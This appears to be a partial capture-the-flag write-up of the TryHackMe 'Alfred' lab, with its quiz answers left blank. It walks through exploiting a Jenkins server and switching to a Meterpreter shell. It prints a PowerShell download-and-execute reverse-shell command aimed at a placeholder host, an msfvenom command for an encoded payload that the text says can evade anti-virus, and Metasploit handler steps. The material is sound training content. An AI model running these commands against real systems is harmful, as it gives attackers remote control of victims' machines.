<p><h3> Welcome to the <em>TryHackMe</em></h3>
<h1>Offensive Pentesting learning path> Advanced Exploitation</h1>
<h2>Alfred</h2>
<p>Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication token.</p>
<br>
October 19, 2024<br><br>
Type: Easy<br>
Link: https://tryhackme.com/r/room/alfred</p><br>

![image](https://github.com/user-attachments/assets/89ba97a4-d79a-4c6d-8c86-dab1becb8e05)


<p><h2>Task 1 - Initial Access</h2>
In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. <br><br>
Since this is a Windows application, we'll be using <strong>Nishang</strong> to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the <strong>reverse shell scripts</strong>.<br><br>
Please note that this machine <strong>does not respond to ping</strong> (ICMP) and may take a few minutes to boot up.

In the following link you´ll find more information about Nishang.https://github.com/samratashok/nishang<br>
And in tis other link we will find more abour reverse shell scripts. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>

<p><br></p>

> 1.1 - <em>How many ports are open? (TCP only)?</em><br>
>> <strong>_______</strong>

<p><br></p>

> 1.2 - <em>What is the username and password for the login panel? (in the format username:password)</em><br>
>> <strong>________</strong>

<p><br></p>

<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <code>powershell iex</code> (<em>New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></p>
<p>You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: <code>python3 -m http.server</code></p>

<p><br></p>

> 1.3 - <br>
>> <strong>No answer needed</strong>

<p><br></p>

> 1.4 - <em>What is the username and password for the login panel? (in the format username:password)</em><br>
>> <strong>____</strong>


<p><h2>Task 2 - Switching Shells</h2>
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.<br><br>
Use msfvenom to create a Windows meterpreter reverse shell using the following payload:<br><br>
>> <strong>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</strong><br><br>
This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.<br><br>
After creating this payload, download it to the machine using the same method in the previous step:<br><br>
>> <strong>powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"</strong><br><br>
Before running this program, ensure the handler is set up in Metasploit:<br><br>
>> <strong>use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run</strong><br><br>
This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell<br><br>
>> <strong>Start-Process "shell-name.exe"</strong><br><br>
This should spawn a meterpreter shell for you!</p>

<p><br></p>

> 2.1 - <em>What is the final size of the exe payload that you generated?</em><br>
>> <strong>_______</strong>




